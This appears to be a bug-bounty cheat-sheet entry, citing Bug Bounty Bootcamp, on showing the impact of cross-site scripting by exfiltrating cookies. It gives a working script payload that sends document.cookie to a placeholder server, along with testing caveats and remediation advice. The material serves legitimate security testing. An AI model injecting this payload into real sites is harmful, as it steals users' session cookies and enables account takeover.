# XSS Impact: Cookie Exfiltration

- What it is: Demonstrate that injected JavaScript can read non-HttpOnly cookies available to the affected origin.
- Where to look: Confirmed XSS on pages where session or sensitive cookies are readable by JavaScript.
- Controlled proof-of-concept pattern:
```html
<script>
image=new Image();
image.src='http://YOUR_SERVER/?c='+document.cookie;
</script>
```
- Use only your own test account/session and a server you control.
- Check the callback request to verify which cookie values were actually readable.
- If the sensitive session cookie is marked `HttpOnly`, `document.cookie` cannot read it.
- Even with HttpOnly, XSS may still perform authenticated actions or read page data.
- False-positive/edge note: Do not claim session takeover unless the exposed cookie is actually sufficient for authentication.
- Remediation: Fix XSS; additionally mark sensitive cookies `HttpOnly`, `Secure`, and appropriately `SameSite`.

## Source: Bug Bounty Bootcamp, Ch. 6
